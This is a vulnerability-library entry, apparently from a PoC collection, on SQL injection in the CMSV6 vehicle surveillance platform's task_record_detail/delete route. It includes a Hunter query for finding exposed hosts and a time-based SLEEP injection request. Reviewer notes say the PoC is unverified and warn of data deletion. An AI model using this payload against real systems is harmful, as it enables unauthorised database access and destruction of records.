---
fofa: ""
source: "wy876 漏洞文库"
product: "通天星 CMSV6 车载视频监控平台"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
category_recommendation: "IOT安全/其他设备"
fofa_unverified: "web.body="
title: "通天星CMSV6车载视频监控平台task_record_detail_delete存在SQL注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：task_record_detaildelete;idsSQLparen;JSESSIONID;matrixsuffix;deletebusinessrecord"
side_effects: "未执行；本文需注意的操作影响：具体副作用：本文 delete 路由会涉及 任务明细记录；把 ids=1 等正常参数当“安全对照”仍可能删除真实业务数据。原探针与方法保留，但测试对象必须是可恢复的隔离记录，须核事前/事后状态。"
source_status: "unknown"
id: "vw-aa2988a817b276d6a4c0260c"
entity_id: "ve-aa2988a817b276d6a4c0260c"
schema_version: "1"
---

## 核对与使用边界

- 测绘字段处置：原 fofa 字段为残缺表达式、错误平台语法或当前解析器不支持的形式，原值完整保留到 fofa_unverified，不把它当作已校验查询或受影响资产证据。正文检索方法保留；具体问题见下列原审阅项。


- 具体副作用：本文 delete 路由会涉及 任务明细记录；把 ids=1 等正常参数当“安全对照”仍可能删除真实业务数据。原探针与方法保留，但测试对象必须是可恢复的隔离记录，须核事前/事后状态。
- JSESSIONID、矩阵路径后缀与 X-Forwarded-For 的出现不能替代路由鉴权证明；只有 URL/请求或 sqlmap 标签，没有配对响应/时延证据，短延迟不能直接判 SQLi。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：task_record_detaildelete;idsSQLparen;JSESSIONID;matrixsuffix;deletebusinessrecord

- **操作与副作用边界（1）**：delete操作及正常ids1)基线可改真实任务数据，需标高影响而非普通扫描。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **结论使用边界（2）**：示例只有URL和请求无时延/响应，不能证明漏洞；sqlmap标签不是运行结果。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **凭据与会话边界（3）**：会话/suffix鉴权前提和具体版本未给，无修复。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **操作与副作用边界（4）**：行业分类/Hunterfofa元数据残缺，保留与其他delete不同业务路由。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 通天星CMSV6车载视频监控平台 task_record_detail/delete存在SQL注入漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台task_record_detail/delete存在SQL注入漏洞，攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征


# 四、漏洞复现
```http
GET /task_record_detail/delete;downloadLogger.action?ids=1)+AND+(SELECT+5394+FROM+(SELECT(SLEEP(5)))tdpw)--+  HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=58586A7CBD64C381945F9AAACFDF7C40
Connection: close
Content-Length: 0
```


sqlmap

```java
/task_record_detail/delete;downloadLogger.action?ids=1)
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cnd2xobo2ctwtife>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
